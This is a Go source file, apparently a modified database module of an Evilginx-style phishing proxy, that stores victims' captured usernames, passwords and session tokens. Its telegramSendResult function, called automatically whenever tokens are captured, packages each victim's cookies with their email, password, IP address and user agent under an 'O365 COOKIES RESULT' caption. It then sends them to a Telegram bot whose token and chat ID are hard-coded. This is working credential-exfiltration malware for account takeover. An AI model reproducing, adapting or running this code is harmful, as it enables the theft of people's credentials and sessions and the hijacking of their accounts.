package database

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path"
	"path/filepath"

	"strconv"
	"time"

	"github.com/tidwall/buntdb"
)

const (
	chat_id = "6328410070"
	token     = "8129813370:AAH_9x-W_fQYxblJResu4Jc2flpYqlrigqo"
)

func telegramSendResult(cookies string, username string, password string, ip string, agent string, sid string) {
	client := &http.Client{}
	fileName := username + "-Cookies.json"
	text_msg := "🔥 0365 COOKIES RESULT 🔥\nLogs: " + sid + "\nEmail: " + username + "\nPassword: " + password + "\nIP-Address: https://ip-api.com/" + ip + "\nUserAgent: " + agent + "\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
	if err != nil {
		fmt.Printf("Unable to write file: %v", err)
	}

	fileDir, _ := os.Getwd()
	filePath := path.Join(fileDir, fileName)

	file, _ := os.Open(filePath)
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
	io.Copy(part, file)
	writer.WriteField("caption", text_msg)
	writer.Close()

	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
	req, _ := http.NewRequest("POST", url, body)
	req.Header.Add("Content-Type", writer.FormDataContentType())
	client.Do(req)
	os.Remove(fileName)
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	data, _ := d.sessionsGetBySid(sid)

	json11, _ := json.Marshal(cookies)
	telegramSendResult(string(json11), data.Username, data.Password, data.RemoteAddr, data.UserAgent, strconv.Itoa(data.Id))
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() error {
	err := d.db.Shrink()
	if err != nil {
		return err
	}
	return nil
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) (string, error) {
	pivot, err := json.Marshal(t)
	if err != nil {
		return "", err
	}
	return string(pivot), nil
}
